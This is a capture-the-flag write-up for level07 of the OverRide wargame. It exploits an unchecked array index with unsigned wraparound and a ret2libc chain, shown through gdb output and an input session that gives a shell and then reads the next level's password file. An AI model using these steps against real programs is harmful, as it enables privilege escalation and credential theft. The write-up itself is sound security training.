# Context

The program is a number storage service. We can store numbers, read the stored numbers, or quit. Looking at the [source code](../source.c) in more detail, we notice that there is no check of the index where we save our numbers in the store_number() function. Therefore, we can write almost anywhere we want on the stack. We'll be able to exploit that, but we'll have to deal with some limitations: 

* First of all, concerning the registration of numbers in the dataset:
    - numbers are stored at `index * 4`
    - `index % 3` must not be equal to 0
    - `number >> 24` must not be equal to 183 

* The program has been compiled with the `-fstack-protector` flag, meaning that the return address of the program is protected with a [stack canary](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries). 

* At the beginning of the program, `av` and `env` are cleared and therefore cannot be used to store shellcode in memory. 

# lead

we are going to exploit the flaw in the store_number() function. Since we can write on the stack with the offset of our choice, we can change the address stored in EIP without overwriting the canary stack.

We could store a shellcode on the stack using the store_number() function, but it would be a bit tedious. Instead, we'll do a ret2libc attack, as we did for the level04.

# Exploit

1. First of all, let's find the address of the buffer. We know it is located at 0x24(%esp) in the main() function. Using gdb, we get the address of ESP (0xffffd520) and then calculate the effective address of the buffer: 0xffffd544.

2. We must then find the address of EIP in order to calculate its offset from the buffer. To do so, we just need to set a breakpoint anywhere in the main() function using gdb, and enter the command `ìnfo frame`. It is the address contained in EIP in the saved registers section that we want: 0xffffd70c. We just have to subtract this address from the buffer address to find the offset. Since we record unsigned int, we have to divide this value by 4 to find the right index. So we want to write from index 114.
```
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd710
 Saved registers:
  eip at 0xffffd70c
(gdb) p 0xffffd70c - 0xffffd544
$1 = 456
```

3. Here's a little issue: 114 is divisible by 3, so the program will prevent us from writing there. But fortunately for us, when an unsigned int overflows (values over 4294967295), it "wraps around". So UINT_MAX + 1 = 0, UINT_MAX + 2 = 1...
`(4294967295 + 1 + 456) / 4 = 1073741938` is not divisible by three, but will write exactly where we want to.

4. Finally, we can find the memory addresses of the system() and exit() functions, as well as the string "/bin/sh", as we did in level04:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```

5. We can now record the decimal value of the system() address at index 1073741938, then the one for exit() at index 115 and finally the one for "/bin/sh" at index 116. Once this is done, a shell will be launched when we try to exit the program:
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115   
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

We can now reach the next level with the command `su level08` and fill in the flag found as a password.